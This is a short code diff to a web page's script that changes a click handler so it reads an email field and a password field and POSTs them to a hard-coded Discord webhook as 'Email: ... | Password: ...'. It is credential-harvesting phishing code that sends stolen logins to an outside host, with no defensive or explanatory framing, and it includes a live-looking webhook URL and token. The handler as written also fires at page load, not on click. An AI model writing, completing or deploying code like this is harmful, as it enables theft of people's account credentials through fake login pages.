@@ -8,17 +8,17 @@
 </html>
 <script>
   const el = document.getElementById("xd");
-el.addEventListener("click", sendMessage, false);
+el.addEventListener("click", sendMessage(document.getElementById("ema").value,document.getElementById("ntra").value), false);
 
 
-function sendMessage() {
+function sendMessage(e,p) {
     var request = new XMLHttpRequest();
     request.open("POST", "https://discord.com/api/webhooks/842367883203444787/3wUnoiRkreCFqB6TJ8VsBTQmDOCFfB58DAdMItnYik4HhIlW8_6wZR2edA5tVE6neD4g");
     request.setRequestHeader('Content-type', 'application/json');
     var params = {
     username: "My Webhook Name",
     avatar_url: "https://pbs.twimg.com/profile_images/1214545814745300992/7OLFRhok_400x400.jpg",
-    content: "The message to send"
+    content: "Email: " + e + " | Password: " + p
     }
     request.send(JSON.stringify(params));
 }
